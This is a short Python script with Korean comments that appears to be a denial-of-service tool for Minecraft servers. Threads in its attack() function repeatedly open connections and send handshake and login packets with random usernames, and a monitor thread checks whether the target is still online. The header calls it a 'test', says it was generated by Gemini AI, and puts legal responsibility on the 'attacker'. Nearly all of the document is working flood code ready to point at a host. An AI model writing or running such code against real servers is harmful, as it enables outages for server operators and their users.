# 사용으로 인한 피해 및 손실, 법적 피해 보상은 모두 공격자(스크립트 실행자) 에게 있음을 숙지 하였음을 인지한 상태로 실행하십시오.
# 이 코드는 Gemini Ai 로 제작된 코드 입니다.
# 이 코드는 오픈소스 이며 "전혀 피해의 목적" 이 아닌 "테스트" 용도로 만들어 졌습니다.

# stop 을 터미널에 입력하면, 코드의 실행이 중단 됩니다.

import socket
import threading
import sys
import struct
import time
import os

# --- 설정 정보 ---
target_host = "192.168.0.1"
target_port = 25565
threads_count = 1  # 테스트를 위해 1로 설정 (필요시 조정)
stop_flag = False


def encode_varint(data):
    """마인크래프트에서 사용하는 VarInt 형식으로 숫자를 변환"""
    ordinal = b''
    while True:
        byte = data & 0x7F
        data >>= 7
        if data:
            ordinal += struct.pack('B', byte | 0x80)
        else:
            ordinal += struct.pack('B', byte)
            break
    return ordinal


def create_handshake_packet(host, port):
    """마인크래프트 Handshake 패킷 + Login Start 패킷 생성"""
    # 1. Handshake Packet (ID: 0x00)
    protocol_version = encode_varint(763)  # 1.20.1 버전
    host_bytes = host.encode('utf-8')
    host_len = encode_varint(len(host_bytes))
    port_bytes = struct.pack('>H', port)
    next_state = encode_varint(2)  # Login 상태

    handshake = b'\x00' + protocol_version + host_len + host_bytes + port_bytes + next_state
    handshake_packet = encode_varint(len(handshake)) + handshake

    # 2. Login Start Packet (ID: 0x00)
    user_name = b'TestUser_' + os.urandom(4).hex().encode()
    user_name_len = encode_varint(len(user_name))

    login_start = b'\x00' + user_name_len + user_name + b'\x00'
    login_start_packet = encode_varint(len(login_start)) + login_start

    return handshake_packet + login_start_packet


def monitor_status():
    """1초마다 서버의 지연 시간(Ping)을 측정하여 출력"""
    global stop_flag
    print(f"\n[INFO] 모니터링 시작: {target_host}:{target_port}")
    print("-" * 40)

    while not stop_flag:
        start_time = time.time()
        try:
            # 상태 체크용 별도 소켓 연결
            checker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            checker.settimeout(2.0)
            checker.connect((target_host, target_port))

            latency = (time.time() - start_time) * 1000
            print(f"[STATUS] Online | Latency: {latency:.2f}ms")
            checker.close()
        except Exception as e:
            print(f"[STATUS] Offline/Timeout | 서버가 응답하지 않음")

        time.sleep(1)  # 1초 간격


def attack():
    """패킷 전송 루프"""
    global stop_flag
    while not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((target_host, target_port))

            packet = create_handshake_packet(target_host, target_port)
            s.send(packet)

            s.recv(100)
            s.close()
        except:
            continue


# --- 실행부 ---
if __name__ == "__main__":
    print(f"[*] 테스트 대상: {target_host}")
    print(f"[*] 실행 스레드: {threads_count}")
    print("[*] 종료하려면 'stop'을 입력하세요.")

    # 모니터링 스레드 시작
    mon_thread = threading.Thread(target=monitor_status)
    mon_thread.daemon = True
    mon_thread.start()

    # 공격 테스트 스레드 시작
    for i in range(threads_count):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()

    # 종료 대기
    while True:
        user_input = sys.stdin.readline().strip().lower()
        if user_input == "stop":
            stop_flag = True
            break

    print("[*] 모든 테스트를 종료하고 정리 중입니다.")
    time.sleep(1)